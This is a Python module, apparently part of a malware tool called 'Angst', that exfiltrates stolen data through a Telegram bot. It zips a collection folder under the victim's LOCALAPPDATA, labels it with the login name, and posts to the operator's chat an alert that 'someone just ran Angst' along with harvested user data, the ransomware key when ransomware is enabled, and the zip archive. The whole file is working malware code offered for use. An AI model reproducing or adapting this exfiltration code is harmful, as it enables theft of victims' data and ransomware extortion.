import requests
import os
import zipfile
import telebot
from telebot import types

class Send_Telegram(object):
    """
    Sends content to our telegram channel
    """
    def __init__(self, telegram_token, telegram_chat_id, userdata, ransomware_key, renabled):
        self.userdata = userdata
        self.ransomware_key = ransomware_key
        self.renabled = renabled
        self.token = telegram_token
        self.chatid = telegram_chat_id
        self.client = telebot.TeleBot(self.token)
        self.send_file()

    def zip_dir(self, path, zipf):
        """
        Zips the folder path
        """
        for root, dirs, files in os.walk(path):
            for file in files:
                zipf.write(os.path.join(path, file), file)

    def send_file(self):
        """
        Sends our current zipped angst directory to our webhook
        """
        ap = os.getenv("LOCALAPPDATA")
        temp = os.path.join(ap, "Angst")
        new = os.path.join(ap, 'Angst-[%s].zip' % os.getlogin())
        zipf = zipfile.ZipFile(new, 'w', zipfile.ZIP_DEFLATED)
        self.zip_dir(temp, zipf)
        zipf.close()
        if self.renabled == False: key = "Ransomware: Not Enabled"
        else: key = "RansomwareKey: %s" % self.ransomware_key.decode()
        alert = "Someone just ran Angst!\nHere are the current stats of the user:\n ```\n{userdata}\n{key}\n```".format(userdata=self.userdata, key=key)
        self.client.send_message(self.chatid, alert, parse_mode="Markdown")
        self.client.send_document(self.chatid, document=open(new,'rb'))
